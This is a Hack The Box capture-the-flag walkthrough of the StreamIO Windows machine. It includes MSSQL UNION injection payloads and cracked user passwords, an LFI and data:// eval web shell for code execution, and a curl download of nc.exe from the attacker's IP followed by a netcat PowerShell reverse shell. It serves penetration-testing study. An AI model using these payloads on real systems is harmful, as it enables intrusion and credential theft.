---
title: "HTB - StreamIO"
categories: [box]
date: 2020-07-30
comments: true
image: /images/walkthroughs/hackthebox/streamio/logo.png
favicon: /images/walkthroughs/hackthebox/streamio/logo.png
description: HTB - StreamIO walkthrough
---

# StreamIO

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/banner.png" width="70%"/>
</p>


## Summary

StreamIO is a medium machine (felt like hard for me) where first you are facing a website where we need to exploit two vulnerabilities. First, SQLi to retrieve admin credentials to the platform. There we can find several endpoints, but using the debug action we found LFI on the file_get_contents function, and we use it to retrieve some source code (with the db admin password) and also to obtain RCE using the data:// wrapper to stream our netcat.exed and the revshell.
Once inside, I used chisel to forward database port and to login as the admin user and we could access the backup database with some passwords, one of them worked on winrm, and we used it to log into the machine.

For the privilege escalation, I obtained the Firefox ini folder with all the passwords stored by the browser, and with some logical combinations of passwords we end up with one more AD valid password. Using Bloodhound, we find a privesc path using JDgodd user, which was capable of Writing Owner to the "Core Staff" group, which has permissions to Read LAPS on the DC. Using that privileges, we set the user nikk37 to be within the "Core Staff" group and then read LAPS with LAPSDumper. Then, using the password we can log into winrm as the administrator.

## Enumeration

Stating with nmap:

```
nmap scan report for 10.10.11.158
Host is up (0.043s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-02 23:17:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_ssl-date: 2022-08-02T23:19:08+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
57447/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-08-02T23:18:31
|_  start_date: N/A
```

We can see some information about the host:
- ISS 10.0 webserver
- DNS:streamIO.htb, DNS:watch.streamIO.htb
- Active directory domain on streamIO.htb0.

Add the following line to the /etc/hosts file:

10.10.11.158 watch.streamIO.htb streamIO.htb

The server still resolving to http://www.streamio.htb/, so add it also in the file.

Any of the three will show me the default web:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/1_1_web.png" width="90%"/>
</p>

Let's take a look first at the DNS first to enumerate the assets:

- 53/tcp    open  domain        Simple DNS Plus

```bash
kali@kali:~/Desktop/HackTheBox/StreamIO$ dig streamio.htb @10.10.11.158 ANY

; <<>> DiG 9.17.19-3-Debian <<>> streamio.htb @10.10.11.158 ANY
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 24470
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;streamio.htb.                  IN      ANY

;; ANSWER SECTION:
streamio.htb.           600     IN      A       10.10.11.158
streamio.htb.           3600    IN      NS      dc.streamio.htb.
streamio.htb.           3600    IN      SOA     dc.streamio.htb. hostmaster.streamio.htb. 332 900 600 86400 3600
streamio.htb.           600     IN      AAAA    dead:beef::aa
streamio.htb.           600     IN      AAAA    dead:beef::a8d3:2b6a:d7a9:626d

;; ADDITIONAL SECTION:
dc.streamio.htb.        3600    IN      A       10.10.11.158
dc.streamio.htb.        3600    IN      AAAA    dead:beef::aa
dc.streamio.htb.        3600    IN      AAAA    dead:beef::a8d3:2b6a:d7a9:626d

;; Query time: 44 msec
;; SERVER: 10.10.11.158#53(10.10.11.158) (TCP)
;; WHEN: Tue Aug 02 12:28:52 EDT 2022
;; MSG SIZE  rcvd: 249
```

So, we can see the dc (Domain Controller) at dc.streamio.htb.

Gobuster shows nothing interesting either, but enumerating subdomains with ffuf shows the watch subdomain:

```bash
gobuster dir -u "https://streamio.htb/" --wordlist=/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20 -k

===============================================================
2022/08/15 13:03:08 Starting gobuster in directory enumeration mode
===============================================================
/ADMIN                (Status: 301) [Size: 150] [--> https://streamio.htb/ADMIN/]
/Admin                (Status: 301) [Size: 150] [--> https://streamio.htb/Admin/]
/Images               (Status: 301) [Size: 151] [--> https://streamio.htb/Images/]
/admin                (Status: 301) [Size: 150] [--> https://streamio.htb/admin/] 
/css                  (Status: 301) [Size: 148] [--> https://streamio.htb/css/]   
/favicon.ico          (Status: 200) [Size: 1150]                                  
/fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/fonts/] 
/images               (Status: 301) [Size: 151] [--> https://streamio.htb/images/]
/index.php            (Status: 200) [Size: 13497]                                 
/js                   (Status: 301) [Size: 147] [--> https://streamio.htb/js/]


## Subdomains:

ffuf -c -u 'https://10.10.11.158' -H 'Host: FUZZ.streamio.htb' -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fc 403,301
________________________________________________

watch                   [Status: 200, Size: 2829, Words: 202, Lines: 79]
:: Progress: [114441/114441] :: Job [1/1] :: 206 req/sec :: Duration: [0:10:55] :: Errors: 0 ::
```


I added the watch.streamio.htb to the /etc/hosts and runned gobuster again over it:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/1_2_watch.png" width="90%"/>
</p>


```bash
gobuster dir -u "https://watch.streamio.htb" --wordlist=/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 60 -k -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://watch.streamio.htb
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
2022/09/27 13:08:46 Starting gobuster in directory enumeration mode
===============================================================
/search.php           (Status: 200) [Size: 253606]
/static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/static/]
/Search.php           (Status: 200) [Size: 253606]                                      
/index.php            (Status: 200) [Size: 2829]                                        
/Static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/Static/]
/Index.php            (Status: 200) [Size: 2829]                                        
/blocked.php          (Status: 200) [Size: 677]                                         
/SEARCH.php           (Status: 200) [Size: 253606]

```

Most relevant path was search.php, where we can see a film browser:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/1_3_search.png" width="90%"/>
</p>


I let the sqlmap run in the background while investigating the rest of the website with the following request:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/1_4_sql.png" width="90%"/>
</p>


We could see that with that inyection, it displayed all the movies, which means that the query could be working. Testing for the following injection (with a **1** previous to the closing quote, I found that all movies displayed end on 1... It could be some kind of regex for [_contains_ keyword](https://www.sqlshack.com/t-sql-regex-commands-in-sql-server/) with the % (sql wildcard) at the end of the string.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/1_5_sql_end.png" width="90%"/>
</p>


Testing for UNION injection, we found that when a query with no result is provided, we obtain columns N2 and N3, that we can use for leaking information:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/1_6_union.png" width="90%"/>
</p>

A little walkthrough on the payloads I tested (I added a quote on the previous line for each payload so the syntax is fiendly on this blog):

```sql
# Payload:
'
test' union select 1-- -

# null


--
# Payload:
'
test' union select 1,2-- -

# null...


--
# Payload:
'
test' union select 1,2,3,4,5,6-- -

# 2, 3
```

Now use the colum 2 for leaking information, for example, the version:

```sql
'
test' union select 1,@@version,3,4,5,6-- -

# Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
```

Get the user which is making the requests on the DB:

```sql
'
test' union select 1,user,3,4,5,6-- -

# dbo
```

Get the actual DB name (use indexes on this method to get the index, i.e. db_name(x)):

```sql
'
test' union select 1,db_name(),3,4,5,6-- -

# STREAMIO
```

Now that we know the database name, we can try to retrieve the tables and its ID. We are getting the ID since we will use it in later queries for making it easy to extract information from. Also, we are using string_agg and concats functions to get it in a single line. It could work without them since we are displaying oseveral rows of the result (stack query). But on limit 1 scenarios, that will help us on leaking data in one row:


```sql
'
test' union select 1,string_agg(concat(name,':',id),'_'),3,4,5,6 from streamio..sysobjects where xtype='u'-- -

# movies:885578193_users:901578250
```

Now let's get the columns using the table id:

```sql
'
test' union select 1,string_agg(concat(name,':',id),'_'),3,4,5,6 from streamio..syscolumns where id=901578250-- -

# id:901578250_is_staff:901578250_password:901578250_username:901578250
```

And now retrieve the data from the table:


```sql
'
test' union select 1,string_agg(concat(username,':',password),'_'),3,4,5,6 from streamio..users-- -
```

Result:

```
James:c660060492d9edcaa8332d89c99c9239
Theodore:925e5408ecb67aea449373d668b7359e
Samantha:083ffae904143c4796e464dac33c1f7d
Lauren:08344b85b329d7efd611b7a7743e8a09
William:d62be0dc82071bccc1322d64ec5b6c51
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5
Robert:f03b910e2bd0313a23fdd7575f34a694
Thane:3577c47eb1e12c8ba021611e1280753c
Carmon:35394484d89fcfdb3c5e447fe749d213
Barry:54c88b2dbd7b1a84012fabc1a4c73415
Oliver:fd78db29173a5cf701bd69027cb9bf6b
Michelle:b83439b16f844bd6ffe35c02fe21b3c0
Gloria:0cfaaaafb559f081df2befbe66686de0
Victoria:b22abb47a02b52d5dfa27fb0b534f693
Alexendra:1c2b3d8270321140e5153f6637d3ee53
Baxter:22ee218331afd081b0dcd8115284bae3
Clara:ef8f3d30a856cf166fb8215aca93e9ff
Barbra:3961548825e3e21df5646cafe11c6c76
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f
Austin:0049ac57646627b8d7aeaccf8b6a936f
Garfield:8097cedd612cc37c29db152b6e9edbd3
Juliette:6dcd87740abb64edfa36d170f0d5450d
Victor:bf55e15b119860a6e6b5a164377da719
Lucifer:7df45a9e3de3863807c026ba48e55fb3
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8
Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5
Robin:dc332fb5576e9631c9dae83f194f8e70
Stan:384463526d288edcc95fc3701e523bc7
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
admin:665a50ac9eaa781e4f7f04199db97a11

```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/1_7_passwords.png" width="90%"/>
</p>


Once we obtained the hashes, let's crack them with hashcat:

```bash
hashcat -a 0 -m 0 --user hashes.txt /usr/share/wordlists/rockyou.txt --show
```

The **passwords** cracked:

```
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd

```

Now, let's recall the /admin path on gobuster, so let's login with some user and visit that path. Actually, only the user yoshihide worked on the login with its credential: **yoshihide:66boysandgirls..** . We end up on an admin panel with several options:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/2_0_admin.png" width="90%"/>
</p>

We can see that the different tabs have different parameters:

```
https://streamio.htb/admin/?user=
https://streamio.htb/admin/?staff=
https://streamio.htb/admin/?movie=
https://streamio.htb/admin/?message=
```

And it uses the ID to delete them:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/2_0_admin.png" width="90%"/>
</p>


On the Admin messages there is nothing interesting. Deleting the movies and user has no efect on our purpose, so I enumerated the actions in the URL. I usually go for the API objects wordlist and found the debug endpoint.

```bash
ffuf -c -u 'https://streamio.htb/admin/?FUZZ=' -H 'Cookie: PHPSESSID=htlip3j1eghqe015cack0nb6hd' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt -fc 403,301 -fs 1678

________________________________________________

debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50]
movie                   [Status: 200, Size: 319875, Words: 15967, Lines: 10779]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399]
user                    [Status: 200, Size: 2073, Words: 146, Lines: 63]

```

Playing around with the parameter, I could not achieve anything with the POST but with the GET and the _index.php_ as value I got an extrange response saying error:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/2_3_error.png" width="90%"/>
</p>


I got stuck for a while, tried direct LFI payloads but nothing came up, then tried PHP wrappers and the first try with the [filters](https://book.hacktricks.xyz/pentesting-web/file-inclusion#php-filter), I got response of the file in rot13:

```
GET /admin/?debug=php://filter/read=string.toupper|string.rot13|string.tolower/resource=index.php HTTP/2
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/2_4_rot.png" width="90%"/>
</p>


Don't wanna mess around with rot13, so I extracted it with base64:

```
GET /admin/?debug=php://filter/convert.base64-encode/resource=index.php HTTP/2
```

```
PD9waHAKZGVmaW5lKCdpbmNsdWRlZCcsdHJ1ZSk7CnNlc3Npb25fc3RhcnQoKTsKaWYoIWlzc2V0KCRfU0VTU0lPTlsnYWRtaW4nXSkpCnsKCWhlYWRlcignSFRUUC8xLjEgNDAzIEZvcmJpZGRlbicpOwoJZGllKCI8aDE+Rk9SQklEREVOPC9oMT4iKTsKfQokY29ubmVjdGlvbiA9IGFycmF5KCJEYXRhYmFzZSI9PiJTVFJFQU1JTyIsICJVSUQiID0+ICJkYl9hZG1pbiIsICJQV0QiID0+ICdCMUBoeDMxMjM0NTY3ODkwJyk7CiRoYW5kbGUgPSBzcWxzcnZfY29ubmVjdCgnKGxvY2FsKScsJGNvbm5lY3Rpb24pOwoKPz4KPCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KCTx0aXRsZT5BZG1pbiBwYW5lbDwvdGl0bGU+Cgk8bGluayByZWwgPSAiaWNvbiIgaHJlZj0iL2ltYWdlcy9pY29uLnBuZyIgdHlwZSA9ICJpbWFnZS94LWljb24iPgoJPCEtLSBCYXNpYyAtLT4KCTxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgoJPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIiAvPgoJPCEtLSBNb2JpbGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iIC8+Cgk8IS0tIFNpdGUgTWV0YXMgLS0+Cgk8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iIiAvPgoJPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IiIgLz4KCTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIiAvPgoKPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4xLjMvZGlzdC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgaW50ZWdyaXR5PSJzaGEzODQtMUJtRTRrV0JxNzhpWWhGbGR2S3VoZlRBVTZhdVU4dFQ5NFdySGZ0akRickNFWFNVMW9Cb3F5bDJRdlo2aklXMyIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+CjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjEuMy9kaXN0L2pzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1rYTdTazBHbG40Z210ejJNbFFuaWtUMXdYZ1lzT2crT01odVArSWxSSDlzRU5CTzBMUm41cSs4bmJUb3Y0KzFwIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KCgk8IS0tIEN1c3RvbSBzdHlsZXMgZm9yIHRoaXMgdGVtcGxhdGUgLS0+Cgk8bGluayBocmVmPSIvY3NzL3N0eWxlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoJPCEtLSByZXNwb25zaXZlIHN0eWxlIC0tPgoJPGxpbmsgaHJlZj0iL2Nzcy9yZXNwb25zaXZlLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiAvPgoKPC9oZWFkPgo8Ym9keT4KCTxjZW50ZXIgY2xhc3M9ImNvbnRhaW5lciI+CgkJPGJyPgoJCTxoMT5BZG1pbiBwYW5lbDwvaDE+CgkJPGJyPjxocj48YnI+CgkJPHVsIGNsYXNzPSJuYXYgbmF2LXBpbGxzIG5hdi1maWxsIj4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij91c2VyPSI+VXNlciBtYW5hZ2VtZW50PC9hPgoJCQk8L2xpPgoJCQk8bGkgY2xhc3M9Im5hdi1pdGVtIj4KCQkJCTxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iP3N0YWZmPSI+U3RhZmYgbWFuYWdlbWVudDwvYT4KCQkJPC9saT4KCQkJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CgkJCQk8YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij9tb3ZpZT0iPk1vdmllIG1hbmFnZW1lbnQ8L2E+CgkJCTwvbGk+CgkJCTxsaSBjbGFzcz0ibmF2LWl0ZW0iPgoJCQkJPGEgY2xhc3M9Im5hdi1saW5rIiBocmVmPSI/bWVzc2FnZT0iPkxlYXZlIGEgbWVzc2FnZSBmb3IgYWRtaW48L2E+CgkJCTwvbGk+CgkJPC91bD4KCQk8YnI+PGhyPjxicj4KCQk8ZGl2IGlkPSJpbmMiPgoJCQk8P3BocAoJCQkJaWYoaXNzZXQoJF9HRVRbJ2RlYnVnJ10pKQoJCQkJewoJCQkJCWVjaG8gJ3RoaXMgb3B0aW9uIGlzIGZvciBkZXZlbG9wZXJzIG9ubHknOwoJCQkJCWlmKCRfR0VUWydkZWJ1ZyddID09PSAiaW5kZXgucGhwIikgewoJCQkJCQlkaWUoJyAtLS0tIEVSUk9SIC0tLS0nKTsKCQkJCQl9IGVsc2UgewoJCQkJCQlpbmNsdWRlICRfR0VUWydkZWJ1ZyddOwoJCQkJCX0KCQkJCX0KCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3VzZXInXSkpCgkJCQkJcmVxdWlyZSAndXNlcl9pbmMucGhwJzsKCQkJCWVsc2UgaWYoaXNzZXQoJF9HRVRbJ3N0YWZmJ10pKQoJCQkJCXJlcXVpcmUgJ3N0YWZmX2luYy5waHAnOwoJCQkJZWxzZSBpZihpc3NldCgkX0dFVFsnbW92aWUnXSkpCgkJCQkJcmVxdWlyZSAnbW92aWVfaW5jLnBocCc7CgkJCQllbHNlIAoJCQk/PgoJCTwvZGl2PgoJPC9jZW50ZXI+CjwvYm9keT4KPC9odG1sPg==
```

This will be the source code:

```php
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
	header('HTTP/1.1 403 Forbidden');
	die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Admin panel</title>
	<link rel = "icon" href="/images/icon.png" type = "image/x-icon">
	<!-- Basic -->
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<!-- Mobile Metas -->
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
	<!-- Site Metas -->
	<meta name="keywords" content="" />
	<meta name="description" content="" />
	<meta name="author" content="" />

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

	<!-- Custom styles for this template -->
	<link href="/css/style.css" rel="stylesheet" />
	<!-- responsive style -->
	<link href="/css/responsive.css" rel="stylesheet" />

</head>
<body>
	<center class="container">
		<br>
		<h1>Admin panel</h1>
		<br><hr><br>
		<ul class="nav nav-pills nav-fill">
			<li class="nav-item">
				<a class="nav-link" href="?user=">User management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?staff=">Staff management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?movie=">Movie management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?message=">Leave a message for admin</a>
			</li>
		</ul>
		<br><hr><br>
		<div id="inc">
			<?php
				if(isset($_GET['debug']))
				{
					echo 'this option is for developers only';
					if($_GET['debug'] === "index.php") {
						die(' ---- ERROR ----');
					} else {
						include $_GET['debug'];
					}
				}
				else if(isset($_GET['user']))
					require 'user_inc.php';
				else if(isset($_GET['staff']))
					require 'staff_inc.php';
				else if(isset($_GET['movie']))
					require 'movie_inc.php';
				else 
			?>
		</div>
	</center>
</body>
</html>
```

We got some creds from the source code:

**db_admin:B1@hx31234567890**

Doesn't seem usefull at the moment. I kept fuzzing to the debug action with several wordlists for APIs etc and found the following paths:

```bash
ffuf -c -u 'https://streamio.htb/admin/?debug=FUZZ.php' -H 'Cookie: PHPSESSID=htlip3j1eghqe015cack0nb6hd' -w /usr/share/wordlicovery/Web-Content/raft-medium-words.txt -fc 403,301 -fs 1712
______________

index                   [Status: 200, Size: 1693, Words: 93, Lines: 47]
master                  [Status: 200, Size: 342677, Words: 17754, Lines: 11159]
Index                   [Status: 200, Size: 0, Words: 1, Lines: 1]
Master                  [Status: 200, Size: 342677, Words: 17754, Lines: 11159]
INDEX                   [Status: 200, Size: 0, Words: 1, Lines: 1]
```

Let's check for the master.php with the LFI obtained before:

master.php

```php
<h1>Movie managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['movie']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST" action="?movie=">
				<input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

Checking the very bottom of the file, we can see the include parameter in the POST method, our target LFI. 
How does this work? Well, we can use the **data://** wrapper, which will generate a data stream with our desired payload, in this case, a reverse shell in PHP. Then, **file_get_contents** will take the stream and return its content, which will be evaluated with the **eval** function. This "feature" also works with the **fopen** function. More information can be found on the [data wrapper docs](https://www.php.net/manual/en/wrappers.data.php)

With a quick POC we get RCE:

Payload:

```php
system($_GET['cmd']);
```

Payload with base64 encoding and _data:// wrapper_:

```php
data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7
```

Request:

```
POST /admin/?debug=master.php&cmd=whoami HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=htlip3j1eghqe015cack0nb6hd
Sec-Ch-Ua: "Chromium";v="95", ";Not A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 61

include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7
```

And we can see the RCE:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/2_5_rce.png" width="90%"/>
</p>


Let's enhace the payload and get netcat on the target machine. Tried to upload a netcat executable to the temp folder but didn't work out, then I tried to load it into the Downloads folder, probably, the Temp folder does not exist on the machine:


```bash
# Payload
curl http://10.10.14.132:5454/nc.exe -o C:\\Downloads\\nc.exe

# Request (short)
POST /admin/?debug=master.php&cmd=curl+http://10.10.14.132:5454/nc.exe+-o+C:\\Downloads\\nc.exe HTTP/2
```


Now use the nc.exe file to do the revshell:

```bash
# Payload
cmd+/c+C:\\Downloads\\nc.exe+-e+powershell+10.10.14.132+5455

# Request (short)
POST /admin/?debug=master.php&cmd=cmd+/c+C:\\Downloads\\nc.exe+-e+powershell+10.10.14.132+5455
```

Once we send the request, we get the revshell:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/3_0_in.png" width="90%"/>
</p>

Checking the users in the machine, we can see the nikk37:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/3_1_users.png" width="60%"/>
</p>

Going back to the enumerated assets, I checked the unused database credentials that we found in the php code and probably the database will be Microsoft SQL, therefore the service might be running on the default port 1433. Since we cannot list the ports used (due to the low priviledges of this user), I will use port forwarding with chisel se I can access to the sql server from my machine.

